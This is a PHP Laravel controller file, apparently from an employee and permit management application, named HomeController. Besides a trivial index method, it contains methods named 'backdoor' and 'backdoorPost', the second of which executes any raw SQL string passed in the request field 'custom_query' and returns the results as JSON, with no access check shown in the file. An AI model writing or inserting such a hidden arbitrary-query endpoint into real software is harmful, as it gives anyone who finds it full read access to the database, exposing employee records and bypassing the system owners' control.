<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\ExamSystem\ExamSystemApi;
use App\Models\Employee;
use App\Models\Permit;
use App\Models\Punishment;
use App\Services\PermitService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        return 1;
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
